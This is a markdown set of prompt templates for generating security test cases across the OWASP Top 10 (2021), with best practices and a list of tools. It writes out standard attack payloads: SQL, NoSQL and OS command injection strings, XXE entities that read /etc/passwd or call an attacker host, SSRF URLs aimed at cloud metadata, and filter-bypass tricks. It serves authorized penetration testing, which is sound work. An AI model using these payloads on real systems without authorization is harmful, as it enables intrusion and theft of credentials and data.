# OWASP Top 10 Security Testing Prompts

## 1. A01:2021 - Broken Access Control Testing

```
Generate test cases for Broken Access Control vulnerabilities:

Application: [APPLICATION_NAME]
Authentication Type: [SESSION/JWT/OAUTH]
User Roles: [LIST_ROLES]

Test scenarios:
1. Horizontal Privilege Escalation
   - User A accessing User B's resources
   - Manipulating user ID in URL/API
   - Direct object reference manipulation
   - Session token swapping

   Test cases:
   - Login as User A (user_id=123)
   - Try to access User B's profile (user_id=456)
     * GET /api/users/456/profile
     * GET /users/456/orders
   - Expected: Access denied (403 Forbidden)
   - Vulnerable: Returns User B's data

2. Vertical Privilege Escalation
   - Regular user accessing admin functions
   - Bypassing role checks
   - Parameter tampering (isAdmin=true)

   Test cases:
   - Login as regular user
   - Attempt admin operations:
     * GET /admin/dashboard
     * POST /admin/users/delete
     * PUT /admin/settings
   - Try role parameter manipulation:
     * POST /api/update-profile {role: "admin"}

3. Missing Function Level Access Control
   - Hidden admin endpoints
   - API endpoints without authorization
   - Unprotected sensitive operations

4. Insecure Direct Object References (IDOR)
   - Sequential ID enumeration
   - UUID/GUID prediction
   - Reference manipulation in requests

5. CORS Misconfiguration
   - Check Access-Control-Allow-Origin: *
   - Credential sharing with untrusted origins
   - Wildcard subdomain access

Generate:
- Automated test scripts
- Manual testing checklist
- Expected vs actual behavior
- Remediation recommendations
```

## 2. A02:2021 - Cryptographic Failures Testing

```
Create test cases for Cryptographic Failures:

Application: [APPLICATION_NAME]
Data Types: [SENSITIVE_DATA_TYPES]

Test scenarios:
1. Data in Transit
   - HTTPS enforcement
   - TLS/SSL version check (should be TLS 1.2+)
   - Certificate validation
   - Weak cipher suite detection
   - Mixed content warnings
   - HTTP Strict Transport Security (HSTS)

   Tests:
   - Access application via HTTP (should redirect to HTTPS)
   - Check certificate: openssl s_client -connect [HOST]:443
   - Scan for weak ciphers: nmap --script ssl-enum-ciphers
   - Verify HSTS header: Strict-Transport-Security: max-age=31536000

2. Data at Rest
   - Database encryption status
   - File storage encryption
   - Backup encryption
   - Key management practices
   - Encryption algorithm strength

   Tests:
   - Query database for plaintext passwords
   - Check for unencrypted PII
   - Verify encryption keys are not hardcoded
   - Test key rotation procedures

3. Password Storage
   - Password hashing algorithm (bcrypt, Argon2, PBKDF2)
   - Salt usage
   - Password in logs/error messages
   - Password transmission (should be encrypted)

   Tests:
   - Inspect database: passwords should be hashed
   - Check for MD5/SHA1 (weak algorithms)
   - Verify unique salts per password
   - Test for plaintext password in logs

4. Sensitive Data Exposure
   - API responses containing sensitive data
   - Error messages revealing system info
   - Debug pages enabled in production
   - Sensitive data in URLs/GET parameters
   - Autocomplete on password fields

5. Weak Cryptographic Algorithms
   - DES, 3DES usage (deprecated)
   - RC4 usage
   - MD5, SHA1 for security purposes
   - Weak random number generation

Generate:
- SSL/TLS scanning scripts
- Data leakage detection tests
- Password storage validation
- Encryption algorithm audit
```

## 3. A03:2021 - Injection Testing

```
Generate injection vulnerability test cases:

Application: [APPLICATION_NAME]
Input Fields: [LIST_INPUT_FIELDS]
Technologies: [DATABASE/LDAP/OS/NOSQL]

Test scenarios:
1. SQL Injection
   Classic SQLi:
   - ' OR '1'='1
   - ' OR '1'='1' --
   - ' OR '1'='1' /*
   - admin' --
   - ' UNION SELECT NULL, NULL, NULL--

   Numeric SQLi:
   - 1 OR 1=1
   - 1' OR '1'='1
   - 1 AND 1=2 UNION SELECT NULL--

   Time-based blind SQLi:
   - '; WAITFOR DELAY '00:00:05'--
   - ' OR SLEEP(5)--
   - ' OR pg_sleep(5)--

   Boolean-based blind SQLi:
   - ' AND 1=1--
   - ' AND 1=2--

   Test locations:
   - Login forms (username, password)
   - Search boxes
   - URL parameters
   - Headers (User-Agent, X-Forwarded-For)
   - Cookies

2. NoSQL Injection (MongoDB)
   - {"$ne": null}
   - {"$gt": ""}
   - {"username": {"$ne": null}, "password": {"$ne": null}}
   - JavaScript injection in MongoDB queries

3. OS Command Injection
   - ; ls
   - | ls
   - & dir
   - && cat /etc/passwd
   - `whoami`
   - $(whoami)

   Test in:
   - File upload names
   - Import/export functions
   - System utilities
   - Report generation

4. LDAP Injection
   - *
   - *()|&'
   - admin*)(%26(password=*)
   - *)(uid=*))(|(uid=*

5. XML Injection (XXE)
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]>

6. XPath Injection
   - ' or '1'='1
   - ' or ''='
   - x' or 1=1 or 'x'='y

Generate:
- Automated fuzzing scripts
- Payload list for each injection type
- Expected secure behavior
- Vulnerability detection methods
```

## 4. A04:2021 - Insecure Design Testing

```
Create test cases for Insecure Design vulnerabilities:

Application: [APPLICATION_NAME]
Critical Workflows: [LIST_WORKFLOWS]

Test scenarios:
1. Business Logic Flaws
   - Price manipulation in e-commerce
   - Negative quantity orders
   - Discount code abuse
   - Referral bonus exploitation
   - Race conditions in transactions

   Example tests:
   - Place order with negative quantity
   - Apply multiple discount codes simultaneously
   - Transfer more money than balance
   - Vote multiple times on same item

2. Insufficient Rate Limiting
   - Password brute force attempts
   - API endpoint abuse
   - OTP brute forcing
   - Account enumeration
   - Resource exhaustion

   Tests:
   - Send 1000 login attempts
   - Make 10000 API calls in 1 minute
   - Generate 100 OTPs consecutively
   - Expected: Rate limit error after threshold

3. Trust Boundary Violations
   - Client-side validation only
   - Price/quantity calculations on client
   - Access control checks on client
   - Sensitive logic in JavaScript

   Tests:
   - Bypass client-side validation
   - Manipulate JavaScript variables
   - Intercept and modify requests
   - Test with JavaScript disabled

4. Missing Anti-Automation
   - No CAPTCHA on sensitive operations
   - No account lockout
   - No velocity checks
   - Automated scraping possible

5. Workflow Bypass
   - Skip payment step in checkout
   - Access restricted features without subscription
   - Bypass multi-factor authentication
   - Complete workflow out of order

Generate:
- Business logic test scenarios
- Rate limiting tests
- Workflow bypass attempts
- Trust boundary validation
```

## 5. A05:2021 - Security Misconfiguration Testing

```
Generate security misconfiguration test cases:

Application: [APPLICATION_NAME]
Infrastructure: [SERVERS/CONTAINERS/CLOUD]

Test scenarios:
1. Default Credentials
   - admin/admin
   - admin/password
   - root/root
   - sa/sa
   - Default database passwords

   Test on:
   - Admin panels
   - Database connections
   - FTP/SSH servers
   - Application servers
   - Network devices

2. Directory Listing
   - Check for exposed directories:
     * /backup
     * /admin
     * /config
     * /.git
     * /.env
     * /uploads

3. Information Disclosure
   - Server headers revealing versions
   - Error stack traces
   - Debug mode enabled
   - Comments in HTML source
   - robots.txt revealing sensitive paths

   Tests:
   - Check response headers: Server, X-Powered-By
   - Trigger errors to see stack traces
   - View page source for comments
   - Access /robots.txt, /sitemap.xml

4. Unnecessary Features Enabled
   - WebDAV enabled
   - Unnecessary HTTP methods (PUT, DELETE, TRACE)
   - Directory browsing
   - Remote administration
   - Sample applications

5. Missing Security Headers
   - X-Frame-Options (Clickjacking protection)
   - X-Content-Type-Options (MIME sniffing)
   - Content-Security-Policy
   - Strict-Transport-Security
   - X-XSS-Protection

   Verify headers:
   curl -I [URL] | grep -i "X-Frame-Options"

6. Outdated Software
   - Check application version
   - Check framework version
   - Check library versions
   - Known vulnerability scanning

Generate:
- Configuration audit checklist
- Automated header checking
- Default credential testing
- Version detection scripts
```

## 6. A06:2021 - Vulnerable and Outdated Components

```
Create test plan for identifying vulnerable components:

Application: [APPLICATION_NAME]
Technology Stack: [LIST_TECHNOLOGIES]

Test scenarios:
1. Dependency Scanning
   JavaScript (npm):
   - Run: npm audit
   - Run: npm outdated
   - Check: package.json for known vulnerable packages

   Python (pip):
   - Run: pip-audit
   - Run: safety check
   - Check: requirements.txt

   Java (Maven):
   - Run: mvn dependency-check:check
   - Check: pom.xml
   - OWASP Dependency-Check

   .NET (NuGet):
   - Run: dotnet list package --vulnerable
   - Check packages.config

2. Framework Version Testing
   - Identify framework version
   - Check against CVE databases
   - Test for known exploits
   - Verify security patches applied

   Methods:
   - Check HTTP headers
   - Inspect error messages
   - Analyze JavaScript files
   - Check meta tags
   - Fingerprinting tools

3. Third-Party Library Testing
   - jQuery version check
   - Bootstrap version check
   - React/Angular/Vue versions
   - Font libraries
   - Analytics scripts

4. Server Software Testing
   - Web server version (Apache, Nginx)
   - Application server (Tomcat, IIS)
   - Database version
   - Operating system version

5. Automated Vulnerability Scanning
   - Run: OWASP Dependency-Check
   - Run: Snyk test
   - Run: Retire.js for JavaScript
   - Run: GitHub Dependabot alerts

Generate:
- Dependency scanning scripts
- Version detection methods
- CVE database queries
- Upgrade priority matrix
```

## 7. A07:2021 - Identification and Authentication Failures

```
Generate authentication testing scenarios:

Application: [APPLICATION_NAME]
Auth Mechanism: [PASSWORD/MFA/SSO/OAUTH]

Test scenarios:
1. Weak Password Policy
   - Allow short passwords (< 8 characters)
   - No complexity requirements
   - Common passwords accepted (password123, qwerty)
   - No password strength meter

   Tests:
   - Register with password: "123"
   - Register with password: "password"
   - Register with username as password

2. Brute Force Attacks
   - No account lockout after failed attempts
   - No CAPTCHA implementation
   - No rate limiting
   - Predictable account recovery

   Tests:
   - Attempt 100 failed logins
   - Use automated tools (Hydra, Burp Intruder)
   - Expected: Account lockout or CAPTCHA

3. Session Management
   - Session fixation
   - Session not invalidated after logout
   - Concurrent sessions allowed
   - Session timeout too long
   - Session token in URL

   Tests:
   - Get session before login, use after login
   - Logout and reuse session token
   - Login from multiple devices simultaneously
   - Check if session expires after idle time

4. Credential Recovery
   - Security questions too easy
   - Password reset token in URL
   - Token doesn't expire
   - Token reusable
   - No rate limiting on reset requests

   Tests:
   - Request multiple password resets
   - Try to reuse old reset token
   - Guess security question answers

5. Multi-Factor Authentication (MFA)
   - MFA bypass possible
   - OTP brute force possible
   - Backup codes unlimited
   - No MFA on sensitive operations

   Tests:
   - Try to bypass MFA page
   - Brute force 6-digit OTP
   - Use same OTP multiple times

6. Authentication Bypass
   - Direct URL access without login
   - Parameter tampering (authenticated=true)
   - Cookie manipulation
   - JWT token manipulation

Generate:
- Authentication test suite
- Session testing scripts
- Brute force detection tests
- MFA bypass attempts
```

## 8. A08:2021 - Software and Data Integrity Failures

```
Create test cases for integrity failures:

Application: [APPLICATION_NAME]
Update Mechanism: [AUTO_UPDATE/MANUAL/CI_CD]

Test scenarios:
1. Unsigned Code and Updates
   - Application updates without signature verification
   - Plugin/extension installation without validation
   - Insecure deserialization

   Tests:
   - Intercept update process
   - Replace legitimate update with malicious one
   - Check for digital signature verification
   - Test with self-signed certificate

2. Insecure Deserialization
   - Java serialization
   - Python pickle
   - PHP unserialize
   - JSON/XML deserialization

   Test payloads:
   - Modified serialized objects
   - Malicious pickle files
   - XXE in XML deserialization

3. CI/CD Pipeline Security
   - Unauthorized access to pipeline
   - Secrets in source code
   - No code signing
   - Vulnerable dependencies auto-deployed

   Tests:
   - Check for hardcoded secrets
   - Test pipeline access controls
   - Verify artifact signing
   - Scan for supply chain attacks

4. Integrity Verification
   - Missing subresource integrity (SRI)
   - No checksum verification
   - Tampered libraries/assets

   Tests:
   - Check for SRI in script/link tags:
     <script src="..." integrity="sha384-..." crossorigin="anonymous">
   - Verify file checksums
   - Test with modified CDN resources

Generate:
- Deserialization attack payloads
- Update mechanism tests
- SRI validation scripts
- Pipeline security audit
```

## 9. A09:2021 - Security Logging and Monitoring Failures

```
Create test plan for logging and monitoring:

Application: [APPLICATION_NAME]
Logging System: [LOG_MANAGEMENT_SYSTEM]

Test scenarios:
1. Insufficient Logging
   - Failed login attempts not logged
   - Privilege escalations not logged
   - Data access not audited
   - Security events not captured

   Verify logging for:
   - Authentication failures
   - Authorization failures
   - Input validation failures
   - Application errors
   - Security-relevant operations

2. Excessive Logging
   - Passwords in log files
   - Session tokens in logs
   - Credit card numbers in logs
   - API keys in logs

   Tests:
   - Search logs for patterns:
     * password=
     * api_key=
     * Bearer [token]
     * Credit card patterns

3. Log Injection
   - Unsanitized input in logs
   - Log forging possible
   - CRLF injection in logs

   Test payloads:
   - Username: admin\nSUCCESS: Login successful for admin
   - Input: %0a%0dNew log entry
   - Test for log splitting

4. Log Tampering
   - Logs can be modified
   - Logs can be deleted
   - No log integrity verification
   - Insufficient access controls

   Tests:
   - Attempt to modify log files
   - Attempt to delete logs
   - Check file permissions
   - Verify log signing/hashing

5. Monitoring and Alerting
   - No alerting on suspicious activities
   - No real-time monitoring
   - No anomaly detection
   - No incident response plan

   Validate alerts for:
   - Multiple failed logins
   - Admin privilege usage
   - Data exfiltration attempts
   - Unusual access patterns

Generate:
- Logging completeness tests
- Log injection payloads
- Sensitive data in logs checker
- Alert trigger tests
```

## 10. A10:2021 - Server-Side Request Forgery (SSRF)

```
Generate SSRF vulnerability test cases:

Application: [APPLICATION_NAME]
Features: [URL_PROCESSING_FEATURES]

Test scenarios:
1. Basic SSRF
   - Access internal services
   - Port scanning internal network
   - Cloud metadata access
   - File protocol access

   Test URLs:
   - http://localhost
   - http://127.0.0.1
   - http://[::1]
   - http://0.0.0.0
   - http://internal-service
   - http://192.168.1.1

2. Cloud Metadata SSRF
   AWS:
   - http://169.254.169.254/latest/meta-data/
   - http://169.254.169.254/latest/user-data/
   - http://169.254.169.254/latest/dynamic/instance-identity/

   Azure:
   - http://169.254.169.254/metadata/instance?api-version=2021-02-01

   GCP:
   - http://metadata.google.internal/computeMetadata/v1/

3. Protocol Smuggling
   - file:///etc/passwd
   - file:///c:/windows/win.ini
   - ftp://internal-ftp-server
   - gopher://internal-service
   - dict://localhost:11211/stats

4. Bypass Techniques
   - IP address obfuscation:
     * http://2130706433 (127.0.0.1 in decimal)
     * http://0x7f000001 (127.0.0.1 in hex)
     * http://127.1
     * http://0177.0.0.1 (octal)

   - Domain tricks:
     * http://localtest.me (resolves to 127.0.0.1)
     * http://redirect.attacker.com → 127.0.0.1

   - URL encoding: http://%31%32%37%2e%30%2e%30%2e%31

5. Blind SSRF
   - No immediate response
   - Use out-of-band detection
   - DNS exfiltration
   - Time-based detection

   Test with:
   - Burp Collaborator
   - http://unique-id.burpcollaborator.net
   - Monitor DNS queries

Test in features:
- Import from URL
- Webhook registration
- PDF generators
- Image processors
- RSS feed readers
- Proxy services

Generate:
- SSRF payload list
- Internal service discovery
- Metadata extraction scripts
- Bypass technique tests
```

## Best Practices

1. **Testing Environment**
   - Use isolated test environment
   - Never test on production
   - Get written authorization
   - Follow responsible disclosure

2. **Test Data**
   - Use synthetic test data
   - Never use real credentials
   - Mask sensitive information
   - Clean up test artifacts

3. **Documentation**
   - Document all findings
   - Include reproducible steps
   - Provide severity ratings
   - Suggest remediation

4. **Automation**
   - Integrate security tests in CI/CD
   - Automated vulnerability scanning
   - Regular security regression tests
   - Continuous monitoring

## Tools

- **OWASP ZAP**: Web application security scanner
- **Burp Suite**: Security testing platform
- **SQLMap**: SQL injection tool
- **Nikto**: Web server scanner
- **Nmap**: Port scanner
- **Metasploit**: Penetration testing framework
- **W3af**: Web application attack framework
- **Nuclei**: Vulnerability scanner

## Security Testing Checklist

- [ ] Tested all OWASP Top 10 categories
- [ ] Automated security scans completed
- [ ] Manual testing performed
- [ ] Findings documented with severity
- [ ] Remediation recommendations provided
- [ ] Re-testing completed after fixes
- [ ] Security sign-off obtained
